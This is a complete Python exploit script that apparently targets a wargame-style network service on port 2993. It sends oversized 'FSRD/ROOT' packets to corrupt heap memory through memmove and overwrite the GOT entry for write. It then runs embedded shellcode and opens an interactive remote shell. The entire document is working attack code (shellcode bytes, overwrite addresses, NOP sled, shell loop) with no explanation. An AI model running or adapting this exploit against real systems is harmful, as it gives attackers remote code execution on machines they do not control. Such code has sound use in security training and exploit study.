import socket,struct
s=socket.socket()
host="192.168.1.15"
port=2993
s.connect((host,port))
shellcode = b"\xd9\xee\x9b\xd9\x74\x24\xf4\x5f\x83\xc7\x25\x8d\x77\x08\x31\xc9\xb1\x04\x0f\x6f\x07\x0f\x6f\x0e\x0f\xef\xc1\x0f\x7f\x06\x83\xc6\x08\xe2\xef\xeb\x08\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a"
#Shellcode from https://www.exploit-db.com/shellcodes/49976
#vulnerability function: memmove
print("Exploiting.....")
s.send(b'FSRD/ROOT///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////')#Send 128 bytes
data=b'FSRDROOT/'+struct.pack("I",0xfffffffc)*2+struct.pack("I",0x804d41c-12)+struct.pack("I",0x804e090+5)
#					-4			GOT of write		addr of shellcode
s.send(data+b"\x90"*12+shellcode+b"\x00"*(128-len(data)-12-len(shellcode)))#Send 128 bytes
s.send(b'\n')
print(s.recv(1024).decode())
while True: #Shell interface
	s.send(input("#~: ").encode()+b'\n')
	print(s.recv(9999).decode())